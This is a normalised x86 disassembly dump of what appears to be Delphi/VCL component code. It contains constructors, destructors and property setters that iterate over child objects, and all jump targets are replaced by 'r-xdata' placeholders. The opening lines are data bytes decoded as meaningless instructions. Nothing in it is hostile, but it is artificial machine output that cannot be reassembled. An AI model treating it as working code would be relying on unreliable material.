add [ eax + ebx + 0xe0044 ] ch
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ fs : eax ] al
add [ eax + edx + 0x780040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
clc
dec esp
imul esi [ ebx + 0x74 ] 0x9b80000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx ] cl
inc esp
add [ eax + 0xa ] dl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ch
or al [ eax + eax + 0x3c ]
or al [ eax + eax - 0x60 ]
add [ eax ] al
add [ esp + eax ] ch
inc esp
add al ah
cdq
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
add [ ebx + esi + 0x33780040 ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
sub_440a34
cld
pop ss
inc esp
add [ eax + ebx ] ah
inc esp
add [ 0x73754354 ] cl
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah cl
0x9ac80041 0x41
add [ ebx - 0x649fffbf ] bl
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
push eax
or al [ eax + eax + 0x7 ]
or eax 0x73754354
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419bbc
test bl bl
jle r-xdata
mov edx esi
call sub_440f58
inc ecx
add [ ebx + ebx * 4 ] dh
inc ecx
add [ ebx + ebx * 4 + 0x41 ] ah
add [ edx + ebx * 4 - 0x64e7ffbf ] al
inc ecx
add [ ebx + ebx * 4 + 0x41 ] ch
add [ eax - 0x65 ] ah
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax 0x4409
add eax 0x30044
or [ ecx + 0x63 ] al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
add [ eax + 0x11 ] cl
inc esp
add [ ecx + edx + 0x44 ] bl
add [ eax + 0x11 ] dh
inc esp
add [ ecx + edx + 0x11980044 ] al
inc esp
add [ ecx + edx + 0x11c00044 ] ch
inc esp
add ah dl
insb
fwait
inc ecx
dec esp
imul esi [ ebx + 0x74 ] 0xac00000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
or eax [ eax + eax + 0x18 ]
add [ eax ] al
add ah ah
and al [ ecx ]
jo r-xdata
0x9b180041 0x41
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
adc [ eax + eax - 0x18 ] eax
adc [ eax + eax - 0x4 ] eax
adc [ eax + eax + 0x10 ] eax
adc al [ eax + eax + 0x14 ]
adc al [ eax + eax + 0x18 ]
adc al [ eax + eax + 0x1c ]
adc al [ eax + eax + 0x20 ]
adc al [ eax + eax + 0x24 ]
adc al [ eax + eax + 0x28 ]
adc al [ eax + eax + 0x2c ]
adc al [ eax + eax + 0x30 ]
adc al [ eax + eax + 0x34 ]
adc al [ eax + eax + 0x38 ]
adc al [ eax + eax + 0x3c ]
adc al [ eax + eax + 0xb ]
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x69e85653
sub esp edi
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
adc [ eax + eax + 0x70 ] eax
adc [ eax + eax - 0x7c ] eax
adc [ eax + eax - 0x68 ] eax
adc [ eax + eax - 0x54 ] eax
adc [ eax + eax - 0x40 ] eax
adc [ eax + eax - 0x2c ] eax
sub_440b44
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419bbc
test bl bl
jle r-xdata
mov edx esi
call sub_440f58
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_440bb4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4196d0
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_440c5c
sub_440be8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_440b78
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4137a8
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_413934
sub_440c30
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_404284
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403ecc
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_440c5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_440f58
mov edx ebx
mov eax esi
call sub_440f38
sub_440c84
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_440c5c
sub_440cb0
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_456824
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403324
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_419c48
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_431a9c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_440d08
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45684c
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403324
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_419c64
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_431a9c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_440d60
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419270
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_440ee4
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_440dcc
push ebx
push esi
push edi
call sub_4034b4
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403128
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4139a0
call sub_403128
mov eax [ edi + 0x30 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4192bc
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40349c
sub_440e1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_440e64
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413914
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov edx edi
call sub_440be8
sub_440eb0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_442c0c
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_442c50
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_419340
sub_440ef0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41958c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_440f58
sub_440f38
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41375c
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_419340
pop esi
pop ebx
retn
sub_440f58
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4139fc
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_440f74
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_440fdc
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_44c604
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_4444a8
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_441884
mov edx ebp
call sub_4418e4
inc eax
je r-xdata
sub_441068
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_441088
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_4410a8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_4414f8
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_4414f8
sub_441240
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419b78
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_441294
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403128
mov eax [ esi + 0x9c ]
call sub_403128
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_440b44
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40cc70
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_4412e4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413f58
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_441390
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_4413f0
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_4414f8
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_441630
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_441690
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_4416ec
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_441750
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_441390
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_404284
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403ecc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d8
test eax eax
je r-xdata
sub_4413f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_4414e8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_440ea8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4032d8
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_440e94
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_4413f0
sub_4414f8
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d8
test eax eax
je r-xdata
sub_441570
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_404284
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403ecc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4138b8
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4138b8
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_4415d8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d8
test eax eax
je r-xdata
sub_441630
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_404284
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403ecc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d8
test eax eax
je r-xdata
sub_441690
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d8
test eax eax
je r-xdata
sub_4416ec
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d8
test eax eax
je r-xdata
sub_441750
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4138b8
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4032d8
test eax eax
je r-xdata
sub_4417b0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_404284
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_4197c8
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_441390
sub_4417fc
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_441824
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_440cb0
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_4413f0
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_4418b8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_414f18
mov edi eax
mov eax esi
call sub_444794
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_4418e4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_441928
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44194d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441954
retn
sub_441ba0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419270
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_441bec
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_419270
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_441c40
push ebx
push esi
push edi
call sub_4034b4
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4139a0
mov edx eax
mov eax edi
call sub_442c0c
mov eax [ edi + 0x50 ]
call sub_403128
mov eax edi
call sub_441f9c
mov eax [ edi + 0x4c ]
call sub_403128
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4192bc
test bl bl
jle r-xdata
call sub_403128
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40349c
sub_441cac
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_441d59
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
